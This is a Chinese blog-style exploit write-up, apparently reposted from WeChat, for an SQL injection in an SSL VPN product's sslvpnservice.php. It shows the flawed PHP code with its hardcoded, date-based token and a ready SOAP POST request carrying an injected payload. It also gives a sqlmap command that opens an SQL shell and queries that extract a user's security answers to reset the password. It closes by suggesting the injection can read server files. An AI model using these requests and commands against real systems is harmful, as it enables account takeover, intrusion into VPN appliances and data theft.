<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vllWjQIXB7vQR0IjUgXpww)

查看版本  

https://xxx.com/index.php/Public/about

ST00001B105<= 未知版本 < ST00001B109

上述版本中间的未知版本需要自行测试，具体到哪个版本就没有详细测试了

这里为了方便回显，寻找流程简单一点的，具体代码如下：  

```
function getAccountDetail($data)
{
    $obj = json_decode($data);
    $token = md5("pc#@%ccW".date("Ymd")."99!&cs");
    $acct = array();
    if($token == $obj->token)
    {
        $tmp = mysql_query("SELECT id FROM user WHERE account='".$obj->user."' limit 1");
        $row = mysql_fetch_array($tmp,MYSQL_ASSOC);
        if(empty($row))
        {
            return json_encode($acct);
        }
        $uid = $row['id'];
        $res = mysql_query("select a.*, d.dev_ip, d.dev_name from t_cfg_dev_list d, t_cfg_acct_list a, t_cfg_res_priv r where d.dev_prep = 0 AND d.dev_disable = 0 AND a.acct_disable = 0 AND a.dev_id = d.id and a.id = '".$obj->acctid."' and r.acct_id = a.id and r.usr_id = '" .$uid . "'");
        while($arr = mysql_fetch_assoc($res))
        {
            $acct[] = $arr;
        }
    }
    return json_encode($acct);
}

```

由于 token 硬编码，所以可以进入 if 导致 sql 注入，构造数据包如下：  

```
POST /sslvpnservice.php HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/89.0.4389.90 Safari/537.36
Connection: close
Cookie: PHPSESSID=8fdj8pske96v2qdg13g36u8872; think_language=zh-cn
Content-Type: text/xml
Content-Length: 580
<?xml version="1.0" encoding="ISO-8859-1"?>
<SOAP-ENV:Envelope SOAPENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAPENV="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAPENC="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<getAccountDetail>
<data>
{"token":"4e28b56969e59a18d72d0050a47f812a","user":"superman","acctid":"-1' or
1=if(1=1,1,2) limit 0,1 -- a","index":"1"}</data>
</getAccountDetail>
</SOAP-ENV:Body></SOAP-ENV:Envelope>

```

![](https://mmbiz.qpic.cn/mmbiz_png/5sMuNdjXwwP51MjEMaNLmq5faicVJib7cibQicZntmm4PfnfJ8yvibyj3821XDEfapNBib478OjpOpuMicnNFQmOibOia1Q/640?wx_fmt=png)

我们构造 sqlmap 方便注入的数据包：

```
POST /sslvpnservice.php HTTP/1.1
Host: xxxx
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/89.0.4389.90 Safari/537.36
Cookie: PHPSESSID=8fdj8pske96v2qdg13g36u8872; think_language=zh-cn
Content-Type: text/xml
Content-Length: 580
<?xml version="1.0" encoding="ISO-8859-1"?>
<SOAP-ENV:Envelope SOAPENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAPENV="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAPENC="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<getAccountDetail>
<data>
{"token":"4e28b56969e59a18d72d0050a47f812a","user":"superman","acctid":"-1' or
1=if(1=1*,1,2) limit 0,1 -- a","index":"1"}</data>
</getAccountDetail>
</SOAP-ENV:Body></SOAP-ENV:Envelope>

```

sqlmap 语句  

```
python2 sqlmap.py -r 1.txt --proxy http://127.0.0.1:8080 --force-ssl --freshqueries --dbms=mysql --delay 1 --sql-shell

```

查询 superman 账号 id, 因为 user 表中 id 参数对应 t_cfg_usr_epw 表中的 usr_id 参数，由此判定 user 表中 id 即为 userid

```
select id from user where account='superman' limit 0,1

```

![](https://mmbiz.qpic.cn/mmbiz_png/5sMuNdjXwwP51MjEMaNLmq5faicVJib7cibIm9JEe6oKGMyuRWNBdN17xQsG5fOPxNvunQPARLAM6GzkGrDKzuQ6A/640?wx_fmt=png)

查询密保答案

```
select answer from user_secret where usr_id=1
select answer2 from user_secret where usr_id=1

```

![](https://mmbiz.qpic.cn/mmbiz_png/5sMuNdjXwwP51MjEMaNLmq5faicVJib7cibgIPkiaDuDcPG5DLwPCLoBwYDZLrb83299Fw9yJCEdFNGyjdHrAsRjicw/640?wx_fmt=png)

我们试试 (答案 2 随便填写)

![](https://mmbiz.qpic.cn/mmbiz_png/5sMuNdjXwwP51MjEMaNLmq5faicVJib7cibLZpG73mA1nXtibLiaVNmsEfpib3yBuGia1f4RJuiascicVNQL6CIweUcxD2Q/640?wx_fmt=png)

可以看到答案完全没问题

由于重置密码会自动生成密码并修改, 具有破坏性，按情况使用。

由于权限够高，可以通过注入读取服务器文件，大家自行构造吧！

---------------------------- 关注我查看其他文章 ----------------------------  

![](https://mmbiz.qpic.cn/mmbiz_png/5sMuNdjXwwOTI9R0HP1ahk5P93K3VZkSr4J0fG743YxiaC4ktBTw4d8yjLjIfPibkzmP7YX0gofU3YhAia7IM86xA/640?wx_fmt=png)